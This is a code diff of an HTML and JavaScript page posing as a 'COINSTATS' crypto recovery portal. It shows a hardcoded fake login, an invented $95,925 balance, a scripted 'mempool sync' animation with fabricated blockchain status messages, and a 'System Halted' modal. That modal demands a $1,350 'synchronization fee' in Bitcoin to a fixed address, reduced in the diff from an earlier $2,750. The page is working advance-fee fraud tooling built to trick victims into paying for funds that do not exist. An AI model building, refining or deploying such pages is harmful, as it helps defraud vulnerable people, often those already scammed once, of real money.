@@ -12,53 +12,77 @@
         .glow { text-shadow: 0 0 30px rgba(16, 185, 129, 0.4); }
         @keyframes flow { 0% { left: -100%; } 100% { left: 300%; } }
         .electricity { position: absolute; height: 2px; background: linear-gradient(90deg, transparent, #10b981, transparent); width: 80px; animation: flow 1.5s linear infinite; }
-    </style>
-    <style>
-  /* Allowance Popup Styles (scoped, paste into <head> or a stylesheet) */
-  .allowance-overlay {
-    position: fixed;
-    inset: 0;
-    display: none;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-    background: rgba(0,0,0,0.72);
-    backdrop-filter: blur(6px);
-    padding: 20px;
-  }
-  .allowance-card {
-    width: 100%;
-    max-width: 560px;
-    background: linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.008));
-    border: 1px solid rgba(255,255,255,0.04);
-    border-radius: 12px;
-    padding: 20px;
-    box-shadow: 0 18px 40px rgba(2,6,23,0.7);
-    color: #e8eef2;
-    font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
-  }
-  .allowance-title { font-weight: 800; font-size: 18px; margin-bottom: 6px; }
-  .allowance-desc { color: #9ca3af; font-size: 14px; line-height:1.45; }
-  .allowance-actions { display:flex; gap:10px; justify-content:flex-end; margin-top:16px; }
-  .allow-btn { background:#10b981; color:#062014; font-weight:800; padding:10px 14px; border-radius:8px; border:0; cursor:pointer; }
-  .cancel-btn { background:rgba(255,255,255,0.03); color:#cfe7d9; padding:9px 12px; border-radius:8px; border:1px solid rgba(255,255,255,0.04); cursor:pointer; }
-  .allow-row { display:flex; align-items:center; gap:8px; margin-top:12px; color:#9ca3af; font-size:13px; }
-  .allow-checkbox { width:16px; height:16px; }
+        
+        /* Mempool Animation Styles */
+        .mempool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(40px, 1fr));
+            gap: 4px;
+            width: 100%;
+            height: 120px;
+            overflow: hidden;
+            opacity: 0.3;
+        }
+        .mempool-block {
+            height: 40px;
+            background: #10b981;
+            border-radius: 4px;
+            animation: pulse-green 2s infinite ease-in-out;
+        }
+        @keyframes pulse-green {
+            0%, 100% { opacity: 0.2; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(1.05); }
+        }
+        
+        .spinning-circle {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(16, 185, 129, 0.1);
+            border-top: 4px solid #10b981;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Modal Overlays */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .modal-card {
+            width: 100%;
+            max-width: 500px;
+            background: #111113;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
     </style>
 </head>
 <body class="selection:bg-emerald-500/30 overflow-x-hidden">
 
-    <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em]">This is private Recovery Funds and will require Login everytime</p>
+    <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em] pl-4">This is private Recovery Funds and will require Login everytime</p>
 
     <!-- LOGIN SECTION -->
     <div id="login-screen" class="min-h-screen flex items-center justify-center p-4 relative overflow-hidden">
         <div class="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-emerald-500/10 rounded-full blur-[120px]"></div>
         <div class="w-full max-w-md bg-zinc-900/50 border border-white/10 rounded-[2.5rem] p-10 backdrop-blur-xl shadow-2xl relative z-10">
-            <div class="flex flex-col items-center mb-10">
+            <div class="flex flex-col items-center mb-10 text-center">
                 <div class="w-16 h-16 rounded-2xl bg-emerald-500 flex items-center justify-center text-black mb-4 shadow-lg shadow-emerald-500/20">
                     <i data-lucide="lock" class="w-8 h-8"></i>
                 </div>
-                <h1 class="text-3xl font-black italic tracking-tight uppercase"COINSTATS</h1>
+                <h1 class="text-3xl font-black italic tracking-tight uppercase">COINSTATS</h1>
                 <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em]">Secure Portal Access</p>
             </div>
             <div class="space-y-6">
@@ -73,18 +97,18 @@
                 <div id="login-error" class="hidden bg-red-500/10 border border-red-500/20 p-4 rounded-xl text-red-500 text-[9px] font-black uppercase tracking-widest text-center animate-pulse">
                     THEFT DETECTION UNABLE TO ACCESS RECOVERY PAYMENT
                 </div>
-                <button onclick="attemptLogin()" class="w-full bg-emerald-500 py-6 rounded-2xl font-black text-black text-lg hover:bg-emerald-400 transition-all shadow-xl shadow-emerald-500/10 uppercase">Decrypt Portal</button>
+                <button onclick="attemptLogin()" class="w-full bg-emerald-500 py-6 rounded-2xl font-black text-black text-lg hover:bg-emerald-400 transition-all shadow-xl shadow-emerald-500/10 uppercase tracking-widest">Decrypt Portal</button>
             </div>
         </div>
     </div>
 
-    <!-- DASHBOARD SECTION (HIDDEN BY DEFAULT) -->
+    <!-- DASHBOARD SECTION -->
     <div id="dashboard" class="hidden min-h-screen">
         <nav class="border-b border-white/[0.05] bg-black/40 backdrop-blur-xl sticky top-0 z-50">
             <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
                 <div class="flex items-center gap-3">
                     <div class="w-9 h-9 rounded-xl bg-emerald-500 flex items-center justify-center text-black"><i data-lucide="shield-check" class="w-5 h-5"></i></div>
-                    <span class="font-bold text-xl tracking-tight uppercase italic">Buss Ellis Elbert</span>
+                    <span class="font-bold text-xl tracking-tight uppercase italic text-white">Buss Ellis Elbert</span>
                 </div>
                 <div class="text-xs font-black text-emerald-500 uppercase tracking-widest">VERIFIED</div>
             </div>
@@ -94,193 +118,175 @@
             <div class="relative overflow-hidden rounded-[2.5rem] bg-zinc-900 border border-white/[0.08] p-12 shadow-2xl">
                 <div class="absolute top-0 right-0 w-96 h-96 bg-emerald-500/[0.05] rounded-full blur-[100px]"></div>
                 <div class="relative z-10 flex flex-col md:flex-row items-center justify-between gap-10">
-                    <div class="space-y-6">
-                        <div class="bg-emerald-500/10 text-emerald-400 px-4 py-1.5 rounded-full w-fit border border-emerald-500/20 text-[10px] font-black uppercase tracking-widest">Asset Valuation (charges May increase due to inflation)</div>
-                        <h1 class="text-6xl sm:text-7xl font-black tracking-tighter glow">$95,925/$95,925🪙 <span class="text-2xl text-zinc-600 font-normal">USD</span></h1>
+                    <div class="space-y-6 text-center md:text-left">
+                        <div class="bg-emerald-500/10 text-emerald-400 px-4 py-1.5 rounded-full w-fit border border-emerald-500/20 text-[10px] font-black uppercase tracking-widest mx-auto md:mx-0">Asset Valuation (charges May increase due to inflation)</div>
+                        <h1 class="text-4xl sm:text-5xl font-black tracking-tighter text-emerald-500 glow">$95,925/$95,925🪙 <span class="text-xl text-zinc-600 font-normal">USD</span></h1>
                     </div>
-                    <button onclick="openModal()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-black py-8 px-12 rounded-[2rem] text-xl shadow-2xl shadow-emerald-500/20 flex items-center transition-all transform hover:scale-105 active:scale-95">
+                    <button onclick="handlePayoutRequest()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-black py-8 px-12 rounded-[2rem] text-xl shadow-2xl shadow-emerald-500/20 flex items-center transition-all transform hover:scale-105 active:scale-95 uppercase tracking-widest">
                         <i data-lucide="wallet" class="mr-3 w-6 h-6"></i> Request Payout
                     </button>
                 </div>
             </div>
         </main>
-        <div class="cryptohopper-web-widget" data-id="9" data-coins="bitcoin,ethereum,tether,cardano,bitcoin-cash,litecoin" data-multi_currencies="AUD,BTC,EUR,GBP,USD" data-realtime="on" data-atid="100"></div>
     </div>
 
-    <!-- WITHDRAWAL MODAL -->
-    <div id="modal" class="fixed inset-0 bg-black/90 backdrop-blur-xl hidden z-[100] flex items-center justify-center p-4">
-        <div id="modal-content" class="bg-[#0a0a0b] border border-white/10 w-full max-w-[520px] rounded-[2.5rem] shadow-2xl relative overflow-hidden">
-            <div class="h-1.5 bg-gradient-to-r from-emerald-500 to-blue-500 w-full"></div>
-            
-            <div id="step-input" class="p-8 space-y-8">
-                <h2 class="text-3xl font-black italic">PAYOUT REQUEST</h2>
-                <div class="space-y-4">
-                    <label class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Select Method</label>
-                    <div class="grid grid-cols-2 gap-2 text-sm font-bold">
-                        <div class="p-4 border-2 border-emerald-500 bg-emerald-500/10 rounded-xl text-center">BITCOIN 🪙</div>
-                    </div>
-                </div>
+    <!-- ALLOWANCE NOTICE MODAL -->
+    <div id="allowance-notice" class="overlay">
+        <div class="modal-card space-y-6">
+            <div class="flex items-center gap-3 text-emerald-400">
+                <i data-lucide="file-check" class="w-8 h-8"></i>
+                <h2 class="text-2xl font-black italic uppercase">Notice Registered</h2>
+            </div>
+            <div class="bg-emerald-500/5 border border-emerald-500/10 rounded-2xl p-6 text-sm text-zinc-300 leading-relaxed space-y-4">
+                <p>Your <span class="text-emerald-400 font-bold">Allowance for Partial Withdrawal</span> has been officially registered and cryptographically signed to your BTC address.</p>
+                <p class="text-zinc-500 italic">Status: Currently pending on the BLOCKCHAIN Network.</p>
+            </div>
+            <div class="space-y-4">
+                <p class="text-xs font-bold text-zinc-500 uppercase tracking-widest">Re-input Bitcoin Address for Confirmation</p>
+                <input id="confirm-address" type="text" placeholder="Enter Bitcoin (BTC) Address" class="w-full bg-black border border-white/10 h-14 rounded-xl px-4 font-mono text-sm outline-none focus:border-emerald-500 transition-all">
+                <p class="text-[9px] text-red-400 font-black uppercase tracking-widest">Caution: No refund for money paid to wrong address.</p>
+            </div>
+            <button onclick="confirmWithdrawal()" class="w-full bg-emerald-500 py-5 rounded-2xl font-black text-black text-lg uppercase tracking-widest">Confirm & Proceed</button>
+        </div>
+    </div>
+
+    <!-- MEMPOOL SYNC SCREEN -->
+    <div id="mempool-screen" class="overlay">
+        <div class="modal-card text-center space-y-10">
+            <div class="flex flex-col items-center gap-6">
+                <div class="spinning-circle"></div>
                 <div class="space-y-2">
-                    <label class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">note: use only Bitcoin (BTC)Address as funds Sent to wrong address are irreversible </label>
-                    <input id="address" type="text" placeholder="Enter details..." class="w-full bg-zinc-900 border border-white/10 h-14 rounded-xl px-4 font-mono text-sm outline-none focus:border-emerald-500">
-                </div>
-                <button onclick="startProcessing()" class="w-full bg-emerald-500 py-6 rounded-2xl font-black text-black text-lg">Submit Request</button>
-            </div>
-
-            <!-- ANIMATION PAGE -->
-            <div id="step-processing" class="hidden p-16 flex flex-col items-center justify-center text-center space-y-12 min-h-[500px]">
-                <div class="flex items-center w-full max-w-[300px] justify-between relative">
-                    <div class="w-20 h-20 rounded-2xl border border-blue-500/50 bg-zinc-900 flex items-center justify-center shadow-[0_0_30px_rgba(59,130,246,0.2)]"><i data-lucide="cpu" class="text-blue-400 w-10 h-10 animate-pulse"></i></div>
-                    <div class="flex-1 h-2 bg-white/5 mx-4 rounded-full relative overflow-hidden border border-white/10"><div class="electricity"></div></div>
-                    <div class="w-20 h-20 rounded-2xl border border-emerald-500/50 bg-zinc-900 flex items-center justify-center shadow-[0_0_30px_rgba(16,185,129,0.2)]"><i data-lucide="zap" class="text-emerald-400 w-10 h-10"></i></div>
-                </div>
-                <div class="space-y-4">
-                    <h3 class="text-3xl font-black italic uppercase">Synchronizing</h3>
-                    <p class="text-[10px] text-zinc-500 font-bold uppercase tracking-[0.2em]">Blockchain verification in progress • please be patient............</p>
-                </div>
-                <div class="w-full max-w-xs h-1.5 bg-zinc-900 rounded-full overflow-hidden border border-white/5">
-                    <div id="progress-bar" class="h-full bg-emerald-500 w-0 transition-all"></div>
+                    <h3 class="text-2xl font-black italic uppercase tracking-tight">Connecting to Mempool</h3>
+                    <p class="text-[10px] text-zinc-500 font-bold uppercase tracking-[0.2em]">Blockchain Syncing in Progress...</p>
                 </div>
             </div>
-
-            <!-- ERROR PAGE -->
-            <div id="step-error" class="hidden flex flex-col">
-                <div class="bg-red-500/10 p-8 border-b border-red-500/20 flex gap-5 items-center">
-                    <div class="w-16 h-16 rounded-2xl bg-red-500/20 flex items-center justify-center"><i data-lucide="alert-triangle" class="text-red-500 w-8 h-8"></i></div>
-                    <div><h3 class="text-2xl font-black text-red-500 italic uppercase">System Halted</h3><p class="text-xs font-bold text-red-400 uppercase tracking-widest">Security Protocol 2.8</p></div>
+            <div id="mempool-visual" class="mempool-grid">
+                <!-- Blocks generated by JS -->
+            </div>
+            <div class="space-y-2">
+                <div class="w-full bg-zinc-900 rounded-full h-1 overflow-hidden">
+                    <div id="mempool-progress" class="h-full bg-emerald-500 w-0 transition-all"></div>
                 </div>
-                <div class="p-8 space-y-8">
-                    <p class="text-zinc-400 text-sm font-medium">A network verification fee of <b>$2750.00 USD</b> is required to unlock your payout of <b>$194,000.67</b>. This is a one-time blockchain sync cost.</p>
-                    <div class="bg-zinc-900 rounded-[2rem] p-6 border border-white/10 space-y-4">
-                        <span class="text-[10px] text-zinc-500 font-black uppercase">Send BTC to:</span>
-                        <div class="font-mono text-[11px] text-emerald-400 break-all bg-black p-4 rounded-xl border border-white/5">bc1qm22cump3ej4gw2frjxrkx34d9tqsyuqkj9pp6l</div>
-                    </div>
-                    <button class="w-full bg-emerald-500 py-6 rounded-2xl font-black text-black text-xl uppercase tracking-widest">Confirm Payment</button>
-                </div>
+                <p id="mempool-status" class="text-[9px] font-mono text-emerald-500/50 uppercase tracking-widest">Awaiting Peer Verification...</p>
             </div>
         </div>
-        <body>) -->
-<div id="allowancePopup" class="allowance-overlay" role="dialog" aria-modal="true" aria-labelledby="allowanceTitle">
-  <div class="allowance-card" role="document">
-    <div>
-      <div id="allowanceTitle" class="allowance-title">ALLOWANCE TO PART WITHDRAW</div>
-      <div class="allowance-desc">
-        By allowing a partial withdrawal you consent to a partial release of funds from escrow. Partial withdrawals may be subject to additional verification and processing steps.
-        Please confirm you understand and wish to proceed.
-      </div>
-
-      <div class="allow-row">
-        <input id="allowDontShow" class="allow-checkbox" type="checkbox" />
-        <label for="allowDontShow">Don't show this again for this session</label>
-      </div>
-
-      <div class="allowance-actions">
-        <button id="allowCancelBtn" class="cancel-btn" type="button">Cancel</button>
-        <button id="allowOkBtn" class="allow-btn" type="button">OK</button>
-      </div>
     </div>
-  </div>
-</div>
+
+    <!-- FINAL FEE MODAL -->
+    <div id="fee-modal" class="overlay">
+        <div class="modal-card space-y-8">
+            <div class="flex items-center gap-4 text-red-500">
+                <div class="w-14 h-14 rounded-2xl bg-red-500/10 flex items-center justify-center">
+                    <i data-lucide="alert-circle" class="w-8 h-8"></i>
+                </div>
+                <div>
+                    <h2 class="text-2xl font-black italic uppercase text-red-500">System Halted</h2>
+                    <p class="text-[10px] font-black text-red-400 uppercase tracking-widest">Consensus Mismatch Found</p>
+                </div>
+            </div>
             
+            <div class="space-y-6">
+                <div class="bg-red-500/5 border border-red-500/10 rounded-2xl p-6 space-y-4">
+                    <p class="text-sm text-zinc-400 leading-relaxed">Mempool refund policy indicates that the past payment has not been submitted completely.</p>
+                    <p class="text-sm font-bold text-white">A final network synchronization fee of <span class="text-emerald-400">$1,350.00 USD</span> is required for immediate transaction processing.</p>
+                </div>
+
+                <div class="space-y-2 text-center md:text-left">
+                    <p class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Expected Payout Amount</p>
+                    <p class="text-3xl font-black text-white italic tracking-tighter">$95,925.00 <span class="text-zinc-500 text-sm font-normal">USD</span></p>
+                </div>
+
+                <div class="bg-black rounded-2xl p-5 border border-white/5 space-y-3">
+                    <div class="flex justify-between items-center">
+                        <span class="text-[10px] text-zinc-500 font-black uppercase">Send BTC to:</span>
+                        <button class="text-emerald-500 text-[10px] font-bold uppercase tracking-widest hover:text-emerald-400 transition-colors">Copy</button>
+                    </div>
+                    <div class="font-mono text-[11px] text-emerald-400 break-all leading-relaxed bg-zinc-900/50 p-4 rounded-xl border border-white/5">bc1qm22cump3ej4gw2frjxrkx34d9tqsyuqkj9pp6l</div>
+                </div>
+
+                <div class="bg-emerald-500/5 border border-emerald-500/10 rounded-xl p-4 flex items-center gap-3">
+                    <i data-lucide="clock" class="w-5 h-5 text-emerald-500"></i>
+                    <p class="text-[10px] text-zinc-400 font-bold uppercase tracking-wide">Est. Delivery: 11-25 Minutes after confirmation</p>
+                </div>
+
+                <button class="w-full bg-emerald-500 py-6 rounded-2xl font-black text-black text-xl uppercase tracking-widest shadow-2xl shadow-emerald-500/10">Pay Synchronization Fee</button>
+            </div>
+        </div>
     </div>
 
     <script>
         lucide.createIcons();
+
+        // Login Logic
         function attemptLogin() {
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
-            if (u === 'agent' && p === 'buss123') {
+            if (u === 'agent' && p === 'Winstone123') {
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('dashboard').classList.remove('hidden');
             } else {
                 document.getElementById('login-error').classList.remove('hidden');
             }
         }
-        function openModal() { document.getElementById('modal').classList.remove('hidden'); }
-        function closeModal() { document.getElementById('modal').classList.add('hidden'); }
-        function startProcessing() {
-            if (document.getElementById('address').value.length < 5) return alert('Enter address');
-            document.getElementById('step-input').classList.add('hidden');
-            document.getElementById('step-processing').classList.remove('hidden');
+
+        // Dashboard Logic
+        function handlePayoutRequest() {
+            document.getElementById('allowance-notice').style.display = 'flex';
+        }
+
+        function confirmWithdrawal() {
+            const addr = document.getElementById('confirm-address').value;
+            if (addr.length < 10) return alert('Please enter a valid Bitcoin address for confirmation.');
+            
+            document.getElementById('allowance-notice').style.display = 'none';
+            showMempoolSync();
+        }
+
+        function showMempoolSync() {
+            const screen = document.getElementById('mempool-screen');
+            const grid = document.getElementById('mempool-visual');
+            const bar = document.getElementById('mempool-progress');
+            const statusLabel = document.getElementById('mempool-status');
+            
+            screen.style.display = 'flex';
+            
+            // Generate Mempool Blocks
+            grid.innerHTML = '';
+            for(let i=0; i<30; i++) {
+                const block = document.createElement('div');
+                block.className = 'mempool-block';
+                block.style.animationDelay = (Math.random() * 2) + 's';
+                grid.appendChild(block);
+            }
+
+            const statuses = [
+                "Broadcasting Transaction...",
+                "Waiting for Peer Response...",
+                "Syncing with Mempool...",
+                "Verifying Inputs...",
+                "Validating UTXO Set...",
+                "Peer-to-Peer Confirmation...",
+                "Awaiting Block Inclusion...",
+                "Finalizing Consensus..."
+            ];
+
             let progress = 0;
-            const bar = document.getElementById('progress-bar');
             const interval = setInterval(() => {
-                progress += (100/28);
+                progress += Math.random() * 1.5;
+                if (progress > 100) progress = 100;
+                
                 bar.style.width = progress + '%';
+                statusLabel.textContent = statuses[Math.floor((progress/100) * (statuses.length - 1))];
+                
                 if (progress >= 100) {
                     clearInterval(interval);
-                    document.getElementById('step-processing').classList.add('hidden');
-                    document.getElementById('step-error').classList.remove('hidden');
+                    setTimeout(() => {
+                        screen.style.display = 'none';
+                        document.getElementById('fee-modal').style.display = 'flex';
+                    }, 500);
                 }
-            }, 1000);
+            }, 100);
         }
-    </script>
-    <script src="https://www.cryptohopper.com/widgets/js/script"></script>
-    <script>
-  (function () {
-    const popup = document.getElementById('allowancePopup');
-    const okBtn = document.getElementById('allowOkBtn');
-    const cancelBtn = document.getElementById('allowCancelBtn');
-    const dontShow = document.getElementById('allowDontShow');
-
-    if (!popup || !okBtn || !cancelBtn || !dontShow) {
-      console.warn('Allowance popup elements missing.');
-      return;
-    }
-
-    // Public API: show/hide functions
-    function showAllowancePopup(auto = false) {
-      // If user already accepted for this session, don't show
-      if (sessionStorage.getItem('allowanceAccepted') === '1') return false;
-      popup.style.display = 'flex';
-      popup.setAttribute('aria-hidden', 'false');
-
-      // Optionally focus OK for keyboard users
-      okBtn.focus();
-      return true;
-    }
-
-    function hideAllowancePopup() {
-      popup.style.display = 'none';
-      popup.setAttribute('aria-hidden', 'true');
-    }
-
-    // OK handler: hide and mark accepted if requested
-    okBtn.addEventListener('click', () => {
-      if (dontShow.checked) sessionStorage.setItem('allowanceAccepted', '1');
-      hideAllowancePopup();
-      // trigger a custom event so the host can continue the withdraw flow
-      window.dispatchEvent(new CustomEvent('allowance:accepted', { detail: { timestamp: Date.now() } }));
-    });
-
-    // Cancel handler: hide and dispatch cancelled event
-    cancelBtn.addEventListener('click', () => {
-      hideAllowancePopup();
-      window.dispatchEvent(new CustomEvent('allowance:cancelled', { detail: { timestamp: Date.now() } }));
-    });
-
-    // Allow ESC to close (cancel)
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape' && popup.style.display === 'flex') {
-        hideAllowancePopup();
-        window.dispatchEvent(new CustomEvent('allowance:cancelled', { detail: { timestamp: Date.now() } }));
-      }
-    });
-
-    // Expose functions for host page to call
-    window.showAllowancePopup = showAllowancePopup;
-    window.hideAllowancePopup = hideAllowancePopup;
-
-    // Auto-show helper: call when dashboard is entered.
-    // If you'd rather call explicitly, remove this block and call showAllowancePopup() exactly when showing the dashboard.
-    document.addEventListener('DOMContentLoaded', () => {
-      // Wait a short moment so dashboard reveal animation can complete before showing the popup
-      setTimeout(() => {
-        // Attempt to show the popup automatically on page load / dashboard entry
-        showAllowancePopup(true);
-      }, 600);
-    });
-  })();
     </script>
 </body>
 </html>
